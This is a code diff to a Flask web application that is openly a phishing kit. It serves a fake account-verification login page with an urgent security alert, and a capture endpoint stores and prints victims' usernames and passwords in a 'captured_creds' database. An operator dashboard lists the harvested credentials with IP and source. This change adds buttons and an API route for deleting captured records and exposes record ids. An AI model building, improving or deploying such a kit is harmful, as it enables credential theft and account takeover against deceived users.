@@ -1,8 +1,8 @@
-from flask import Flask, request, jsonify, render_template_string, redirect
+from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 import psycopg2
 import os
-from datetime import datetime, timedelta
+from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
@@ -33,7 +33,6 @@ def init_db():
 
 init_db()
 
-# Dashboard HTML
 DASHBOARD_HTML = '''
 <!DOCTYPE html>
 <html>
@@ -51,8 +50,9 @@ DASHBOARD_HTML = '''
         input,button{width:100%;padding:12px;margin:10px 0;background:#0a0e27;color:#00ffcc;border:1px solid #00ffcc;border-radius:5px;}
         .stats{background:#1a1f3a;padding:15px;border-radius:10px;margin-bottom:20px;}
         .badge{background:#ff3366;color:white;padding:2px 8px;border-radius:20px;font-size:11px;}
+        .delete-btn{background:#ff3366;color:white;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:11px;}
+        .delete-btn:hover{background:#ff0000;}
         .success{color:#00ff00;}
-        .refresh-btn{background:#1a1f3a;border:1px solid #00ffcc;padding:5px 10px;cursor:pointer;margin-left:10px;}
     </style>
     <script>
         let authenticated = false;
@@ -75,6 +75,12 @@ DASHBOARD_HTML = '''
             const data = await res.json();
             if (data.success) { checkAuth(); } else { alert('Wrong password'); }
         }
+        async function deleteRecord(id) {
+            if (confirm('Delete this record?')) {
+                await fetch('/api/delete/' + id, {method: 'DELETE'});
+                loadData();
+            }
+        }
         async function loadData() {
             const res = await fetch('/api/data');
             const data = await res.json();
@@ -86,6 +92,7 @@ DASHBOARD_HTML = '''
                     <td><span class="badge">${r.source}</span></td>
                     <td><strong>${r.username}</strong></td>
                     <td><strong style="color:#ffd700;">${r.password}</strong></td>
+                    <td><button class="delete-btn" onclick="deleteRecord(${r.id})">Delete</button></td>
                 </tr>`;
             }
             document.getElementById('data').innerHTML = html;
@@ -112,7 +119,7 @@ DASHBOARD_HTML = '''
     </div>
     <div style="overflow-x:auto;">
     <table>
-        <thead><tr><th>Time</th><th>IP</th><th>Source</th><th>Username</th><th>Password</th></tr></thead>
+        <thead><tr><th>Time</th><th>IP</th><th>Source</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>
         <tbody id="data"></tbody>
     </table>
     </div>
@@ -121,7 +128,6 @@ DASHBOARD_HTML = '''
 </html>
 '''
 
-# Advanced Phishing Page
 PHISHING_HTML = '''
 <!DOCTYPE html>
 <html>
@@ -131,40 +137,19 @@ PHISHING_HTML = '''
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container{
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            width: 480px;
-            max-width: 100%;
-            padding: 40px;
-        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
+        .container{background:white;border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.2);width:480px;max-width:100%;padding:40px;}
         .logo{text-align:center;margin-bottom:30px;}
         .logo h1{font-size:32px;color:#2c7be5;letter-spacing:-1px;}
         .logo p{color:#666;font-size:14px;}
-        .alert-critical{
-            background: #f8d7da;
-            border-left: 4px solid #dc3545;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-        }
+        .alert-critical{background:#f8d7da;border-left:4px solid #dc3545;padding:15px;border-radius:8px;margin-bottom:25px;}
         .alert-critical strong{color:#721c24;display:block;margin-bottom:5px;}
         .alert-critical p{color:#721c24;font-size:13px;margin:0;}
         .input-group{margin-bottom:20px;}
         .input-group label{display:block;margin-bottom:8px;font-weight:500;color:#333;font-size:14px;}
-        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;transition:0.2s;}
+        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;}
         .input-group input:focus{outline:none;border-color:#2c7be5;box-shadow:0 0 0 3px rgba(44,123,229,0.1);}
-        button{width:100%;padding:14px;background:#2c7be5;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s;}
+        button{width:100%;padding:14px;background:#2c7be5;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;}
         button:hover{background:#1a68d1;}
         .footer{text-align:center;margin-top:25px;padding-top:20px;border-top:1px solid #eee;}
         .footer a{color:#2c7be5;text-decoration:none;font-size:13px;margin:0 10px;}
@@ -185,11 +170,11 @@ PHISHING_HTML = '''
     <form id="loginForm">
         <div class="input-group">
             <label>Email Address / Username</label>
-            <input type="text" id="username" placeholder="Enter your email or username" required autocomplete="off">
+            <input type="text" id="username" placeholder="Enter your email or username" required>
         </div>
         <div class="input-group">
             <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
+            <input type="password" id="password" placeholder="Enter your password" required>
         </div>
         <button type="submit">Verify Account Now</button>
     </form>
@@ -263,15 +248,26 @@ def capture():
     print(f"[+] CAPTURED! {data.get('username')}:{data.get('password')}")
     return jsonify({'status': 'ok'})
 
+@app.route('/api/delete/<int:id>', methods=['DELETE'])
+def delete_record(id):
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute('DELETE FROM captured_creds WHERE id = %s', (id,))
+    conn.commit()
+    cur.close()
+    conn.close()
+    print(f"[+] Deleted record ID: {id}")
+    return jsonify({'status': 'ok'})
+
 @app.route('/api/data')
 def get_data():
     conn = get_db()
     cur = conn.cursor()
-    cur.execute('SELECT timestamp, ip, source, username, password FROM captured_creds ORDER BY timestamp DESC LIMIT 100')
+    cur.execute('SELECT id, timestamp, ip, source, username, password FROM captured_creds ORDER BY timestamp DESC LIMIT 100')
     rows = cur.fetchall()
     cur.close()
     conn.close()
-    return jsonify([{'timestamp': r[0], 'ip': r[1], 'source': r[2], 'username': r[3], 'password': r[4]} for r in rows])
+    return jsonify([{'id': r[0], 'timestamp': r[1], 'ip': r[2], 'source': r[3], 'username': r[4], 'password': r[5]} for r in rows])
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
